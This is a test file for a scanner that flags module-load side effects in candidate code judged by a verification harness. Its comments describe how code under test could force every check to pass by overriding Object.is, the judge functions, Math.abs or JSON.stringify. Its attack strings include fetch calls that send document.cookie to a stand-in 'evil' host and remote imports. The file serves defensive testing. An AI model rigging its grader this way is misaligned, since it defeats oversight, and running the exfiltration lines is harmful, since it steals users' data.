// =============================================================================
// THE JUDGE MUST NOT BE REACHABLE FROM THE DOCK
//
// The verification harness splices the candidate's source in at module scope
// and then compares results with __deepEqual. The candidate therefore executes
// BEFORE the comparator is ever called, and for a while one line was enough to
// own the verdict:
//
//     function tick(w){ return w; } Object.is = () => true;
//
// __deepEqual begins `if (Object.is(a, b)) return true;`, so every regression
// case and every acceptance criterion would compare equal. Nine of nine. Five
// of five. Converged. Shipped. A system that only says yes when yes is true,
// saying yes because the thing under test asked it to.
//
// The scanner that should have rejected that line did not, for two independent
// reasons, both measured rather than reasoned about:
//
//   * It tested only a line's PREFIX, so anything after a complete `function
//     f(){}` on the same line was never looked at.
//   * stripLiterals did not understand regex literals, so `const RE = /[{]/;`
//     left an unbalanced brace, depth never returned to zero, and every
//     subsequent line was treated as nested and skipped. One regex switched
//     the whole scanner off, silently.
//
// Two defences now, deliberately: the harness captures its comparators above
// the splice point (an invariant), and the scanner catches the line (a filter).
// The invariant is the one that matters -- a filter is only ever as good as the
// last payload someone thought of.
//
// A scanner that rejects ordinary code is not "safe by default", it is a
// scanner that gets switched off, so the false-positive tests below are as
// load-bearing as the attack ones.
// =============================================================================
import { test } from "node:test";
import assert from "node:assert/strict";

import { topLevelSideEffects } from "../src/worldEdit";
import { buildSimHarnessModule } from "../src/simSandbox";
import { SIM_BASELINE_SOURCE } from "../src/simBaseline";

const ATTACKS: Record<string, string> = {
  "a complete declaration does not exempt the rest of its line":
    'function tick(w){ return w; } fetch("https://evil/?c=" + document.cookie);',
  "overriding the comparator's own intrinsic, after a declaration":
    "function tick(w){ return w; } Object.is = () => true;",
  "a regex literal must not unbalance the depth counter":
    'const RE = /[{]/;\nfetch("https://evil/");',
  "a bare statement": 'fetch("");',
  "a bare global assignment": "Object.is = () => true;",
  "a class static initialiser block": 'class A { static { fetch("x"); } }',
  "a top-level import is a remote code fetch": 'import x from "https://evil/m.js";',
  "an assignment hidden in an initialiser": 'var _y = (globalThis.x = 1);',
  "an arrow IIFE": 'const _z = (() => { fetch("https://evil/"); })();',
  "a function-expression IIFE": 'const _w = function(){ fetch("x"); }();',

  // ---- the shapes a LINE-BASED scanner kept missing --------------------
  // Every one of these was caught, then missed again by a fix for the
  // previous one. The scanner now splits into top-level STATEMENTS, because a
  // line is not a unit of execution and "what else is on this line" was a
  // question three separate patches answered wrongly.
  "a const prefix does not exempt the rest of the line":
    "const _a = () => {}; Object.is = () => true;",
  "...nor does a function-expression prefix":
    "const _a = function(){}; Object.is = () => true;",
  "...nor does it hide a fetch":
    'const _a = () => {}; fetch("https://evil/");',
  "...nor a dynamic import":
    'const _a = () => {}; import("https://evil/m.js");',
  "a regex after a keyword must not unbalance the depth counter":
    'function isBrace(s) { return /[{]/.test(s); }\nfetch("https://evil/?c=" + document.cookie);',
  "a division after a string must not be read as a regex and swallow the next line":
    'const x = "5" / 2;\nfetch("https://evil/");',
  "...or after a template literal":
    'const x = `5` / 2;\nObject.is = () => true;',
  "...or after an increment":
    'let i = 0;\nconst y = i++ / 2;\nfetch("https://evil/");',
};

for (const [name, src] of Object.entries(ATTACKS)) {
  test(`rejected: ${name}`, () => {
    const offenders = topLevelSideEffects(src);
    assert.ok(offenders.length > 0, `NOT CAUGHT -- this source would run at module load:\n${src}`);
  });
}

test("the shipped baseline is clean -- no false positives on the real world", () => {
  assert.deepEqual(topLevelSideEffects(SIM_BASELINE_SOURCE), []);
});

test("ordinary code is not rejected", () => {
  // A scanner that flags a normal arrow function is one a maintainer disables.
  // The calls here are in FUNCTION BODIES: they run when called, not at load.
  const legitimate = `
const NAMES = ["a", "b"];
const RE = /[{}()]/g;
const slug = (s) => s.replace(RE, "").trim();
const sq = function (x) { return x * x; };
const load = async (u) => (await fetch(u)).json();
const half = (n) => n / 2;
function tick(w) { return { ...w, t: w.t + 1 }; }
export function initialWorld() { return { t: 0, names: NAMES.map(slug) }; }
class Thing { constructor() { this.n = 0; } }

// MULTI-LINE function bodies. A fix that skipped the depth counter rejected
// every one of these -- the body was scanned as if it were top level, so
// "w.money -= a.cost;" was reported as a module-load side effect. The
// false-positive tests only used SINGLE-LINE arrows, so it passed 264/264
// while making the scanner unusable on ordinary model output.
export const applyAction = (w, a) => {
  w.money -= a.cost;
  return w;
};
const step = function (w) {
  w.t += 1;
  return w;
};
`;
  assert.deepEqual(topLevelSideEffects(legitimate), []);
});

test("the harness captures its comparators before the candidate runs", () => {
  // Asserted against the module the harness ACTUALLY BUILDS, not against the
  // text of simSandbox.ts -- a grep-the-source test passes the moment someone
  // reformats, and this invariant is invisible in review and total in effect.
  const built = buildSimHarnessModule("/*CANDIDATE*/", [{ name: "t", fn: "tick", args: [], expected: null } as never]);
  const capture = built.indexOf("const __is = Object.is;");
  const candidate = built.indexOf("/*CANDIDATE*/");
  assert.ok(capture > -1, "the comparator intrinsics must be captured by name");
  assert.ok(candidate > -1, "the candidate source must still be spliced in");
  assert.ok(
    capture < candidate,
    "the capture must come BEFORE the candidate, or it captures whatever the candidate left behind",
  );
  assert.ok(
    !/if \(Object\.is\(a, b\)\) return true;/.test(built),
    "__deepEqual must compare with the captured __is, not the live Object.is",
  );
  assert.ok(
    /if \(__is\(a, b\)\) return true;/.test(built),
    "__deepEqual must actually use the captured reference",
  );
});

test("the judge itself cannot be reassigned by the candidate", () => {
  // Capturing the INTRINSICS was not enough, and the comment claiming it made
  // the attack "impossible" was wrong. __deepEqual and __partialMatch were
  // function DECLARATIONS, which hoist into mutable module-scope bindings, so
  //     const _a = () => {}; __deepEqual = () => true;
  // owned the verdict exactly as overriding Object.is had. Confirmed in a real
  // ES module: it returned true for __deepEqual(1, 2).
  //
  // Declared with const BELOW the splice point, the binding is in the temporal
  // dead zone while the candidate runs, so the assignment throws instead of
  // succeeding. That is a property of the language, not of a filter.
  const built = buildSimHarnessModule("/*CANDIDATE*/", [{ name: "t", fn: "tick", args: [], expected: null } as never]);
  for (const name of ["__deepEqual", "__partialMatch"]) {
    assert.ok(
      built.includes(`const ${name} = `),
      `${name} must be a const, not a hoisted function declaration a candidate can reassign`,
    );
    assert.ok(
      !new RegExp(`function\\s+${name}\\s*\\(`).test(built),
      `${name} must not be declared with \`function\` -- that binding is mutable and the candidate runs first`,
    );
  }
});


test("everything the verdict travels through is captured, not just the comparator", () => {
  // Capturing Object.is closed one route and left two open, both confirmed by
  // execution against the built harness:
  //     Math.abs = () => 0;             -> every tolerance assertion passes
  //     JSON.stringify = () => '[...]'  -> the results are replaced wholesale
  //                                        on the way out, whatever ran
  // The rule is not "protect __deepEqual". It is that nothing on the path from
  // running a test to reporting its result may be reachable by the code under
  // test. Asserted against the module the harness builds, so a future edit that
  // reaches for the live intrinsic fails here.
  const built = buildSimHarnessModule("/*CANDIDATE*/", [{ name: "t", fn: "tick", args: [], expected: null } as never]);
  const candidate = built.indexOf("/*CANDIDATE*/");
  for (const name of ["__abs", "__stringify", "__Response"]) {
    const at = built.indexOf(`const ${name} = `);
    assert.ok(at > -1, `${name} must be captured -- the live intrinsic is reachable by the candidate`);
    assert.ok(at < candidate, `${name} must be captured BEFORE the candidate runs, or it captures whatever the candidate left`);
  }
  assert.ok(!/Math\.abs\(actual - t\.expected\)/.test(built),
    "the tolerance check must use the captured __abs");
  assert.ok(!/new Response\(JSON\.stringify\(results\)/.test(built),
    "the result must be serialised and returned through the captured references");
});

// =============================================================================
// THE FULL CORPUS
//
// Three rounds of this check were defeated, and each fix was written against
// the ONE payload that had just been demonstrated -- so the next round found
// the same idea spelled differently. A handful of examples is not a test of a
// classifier; it is a test of the last example someone thought of.
//
// So: every attack shape found across all three rounds, plus the ordinary
// constructs a generated world actually contains. The must-ALLOW half is not
// decoration -- a scanner that rejects a multi-line arrow is one a maintainer
// disables, and that happened here.
// =============================================================================
const MUST_CATCH: Record<string, string> = {
  "a bare call": 'fetch("x");',
  "a bare assignment": "Object.is = () => true;",
  "const prefix, then an assignment": "const _a = () => {}; Object.is = () => true;",
  "let prefix, then an assignment": "let _a = () => {}; Object.is = () => true;",
  "var prefix, then a call": 'var _a = function(){}; fetch("x");',
  "export const prefix, then the judge": "export const _a = () => {}; __deepEqual = () => true;",
  "function declaration, then an assignment": "function t(w){return w;} Object.is = () => true;",
  "class declaration, then an assignment": "class A {} Object.is = () => true;",
  "export function, then the judge": "export function t(w){return w;} __deepEqual = () => true;",
  "three statements on one line": 'const a = 1; const b = 2; fetch("x");',
  "after a multi-line function body": 'function t(w) {\n  return w;\n}\nObject.is = () => true;',
  "after a multi-line arrow body": 'const t = (w) => {\n  return w;\n};\nfetch("evil");',
  "a class static initialiser block": 'class A { static { fetch("x"); } }',
  "a top-level import": 'import x from "https://evil/";',
  "a dynamic import in an initialiser": 'const _a = import("https://evil/");',
  "a dynamic import after a declaration": 'const _a = () => {}; import("https://evil/");',
  "an arrow IIFE": 'const _z = (() => { fetch("x"); })();',
  "a function-expression IIFE": 'const _w = function(){ fetch("x"); }();',
  "an assignment hidden in an initialiser": "var _y = (globalThis.x = 1);",
  "a regex after `return` must not unbalance the depth counter":
    'function b(s) { return /[{]/.test(s); }\nfetch("evil");',
  "a division after a string must not be read as a regex": 'const x = "5" / 2;\nfetch("evil");',
  "...after a template literal": "const x = `5` / 2;\nObject.is = () => true;",
  "...after an increment": 'let i = 0;\nconst y = i++ / 2;\nfetch("evil");',
  "...after a call": 'const y = f() / 2;\nfetch("evil");',
  "a regex after an open paren": 'const m = (/[{]/).test("x");\nfetch("evil");',
  "a regex after an equals": "const RE = /[}]/;\nfetch('evil');",
  "a regex inside an array": "const a = [1, /[{]/];\nfetch('evil');",
  "after an object literal": "const o = { a: 1 }; Object.is = () => true;",
  "after an array literal": 'const o = [1, 2]; fetch("evil");',
  "after an exported class": 'export class A {} fetch("evil");',
  "after a line comment": '// hi\nfetch("evil");',
  "after a block comment": '/* hi */ fetch("evil");',
  "a top-level await": 'await fetch("evil");',
  "a labelled statement": 'x: fetch("evil");',

  // ---- round 4: what the hand-rolled tokenizer still missed ----------------
  // Every one of these was clean under the statement-splitting version. They
  // are why this is a parser now: each is ordinary JavaScript that a character
  // scanner has no principled way to classify.
  "a second declarator after a function one":
    'const noop = () => {}, boom = fetch("https://evil/?c=" + document.cookie);',
  "...hiding an assignment instead of a call":
    'const noop = () => {}, boom = (document.body.innerHTML = "x");',
  "...exported": 'export const t = (w) => w, _x = fetch("https://evil/x");',
  "...with let": "let t = x => x, _x = fetch('https://evil/x');",
  "...carrying a class expression with a static block":
    'const noop = () => {}, C = class { static { fetch("x"); } };',
  "a call in a ternary's test": 'const flag = fetch("https://evil/x") ? 1 : () => 0;',
  "a regex after ) in an if header":
    'export function f(s){ if (s) /\\{/.test(s); return s; }\nfetch("https://evil/x");',
  "a regex after ) in a while header":
    'function f(s){ while (s) /[{]/.test(s); return s; }\nfetch("evil");',
  "a regex after ) in a for-of header":
    'function f(s){ for (const c of s) /^\\{/.test(c); return s; }\nfetch("evil");',
  "semicolon-free source (ASI)":
    'const clamp = (n) => n\nfunction tick(w) { return w }\nexport function initialWorld() { return { t: 0 } }\nfetch("https://evil/x")',
  "a getter that is actually read": 'const o = { get n() { return fetch("x"); } };\nconst _z = o.n;',
};

const MUST_ALLOW: Record<string, string> = {
  "an ordinary world": 'const N = ["a"];\nfunction tick(w){ return { ...w, t: w.t + 1 }; }\nexport function initialWorld(){ return { t: 0 }; }',
  "a multi-line arrow binding": "export const applyAction = (w, a) => {\n  w.money -= a.cost;\n  return w;\n};",
  "a multi-line function expression": "const step = function (w) {\n  w.t += 1;\n  return w;\n};",
  "an async arrow": "const load = async (u) => (await fetch(u)).json();",
  "a single-line arrow containing a regex": 'const slug = (s) => s.replace(/[{}()]/g, "").trim();',
  "actual division": "const half = (n) => n / 2;\nfunction t(w){return w;}",
  "a class with methods": "class Thing {\n  constructor(){ this.n = 0; }\n  bump(){ this.n += 1; return this.n; }\n}",
  "an object-literal binding": 'const CFG = {\n  size: 10,\n  name: "x",\n  nested: { a: 1 },\n};',
  "an array of objects": 'const S = [\n  { id: "a", x: 1 },\n  { id: "b", x: 2 },\n];',
  "a template literal": 'const url = `https://x/{a}/${"b"}`;\nfunction t(w){return w;}',
  "a declaration with no initialiser": "let cache;\nfunction t(w){return w;}",
  "an export default function": "export default function tick(w){ return w; }",
  "nested arrows": "const mk = (a) => (b) => a + b;",
  "a generator": "function* gen(){ yield 1; }",
  "comments alone": "// just a comment\n/* and a block */",
  "a trailing comment after a declaration": "function t(w){ return w; } // fine",

  // ---- round 4: ordinary code the tokenizer REJECTED -----------------------
  // The first of these is this repository's own public/buildings.js style. A
  // check that refuses the project's own idiom is one that gets deleted.
  "an object literal whose values are arrows":
    "export const HEIGHT = {\n  TERRACE: (r) => 12 + r * 9,\n  TOWER: (r) => 62 + Math.pow(r, 1.9) * 205,\n};",
  "a shorthand method in an object": "const api = { tick(w) { return w; } };",
  "a getter that is defined but never read": "const o = { get n() { return 1; } };",
  "a nested arrow config": "const M = { a: { b: (x) => f(x) } };",
  "semicolon-free ordinary source":
    "const CFG = { size: 10 }\nfunction tick(w) { return w }\nexport function initialWorld() { return { t: 0 } }",
  "comma declarators that are all inert": 'const a = () => {}, b = 2, c = "x";',
  "a class expression with no static block": "const C = class { constructor(){ this.n = 0; } };",
};

for (const [name, src] of Object.entries(MUST_CATCH)) {
  test(`corpus -- rejected: ${name}`, () => {
    assert.ok(topLevelSideEffects(src).length > 0, `NOT CAUGHT -- this runs at module load:\n${src}`);
  });
}

for (const [name, src] of Object.entries(MUST_ALLOW)) {
  test(`corpus -- allowed: ${name}`, () => {
    assert.deepEqual(topLevelSideEffects(src), [],
      `FALSE POSITIVE -- ordinary code was rejected, which is how this check gets switched off:\n${src}`);
  });
}
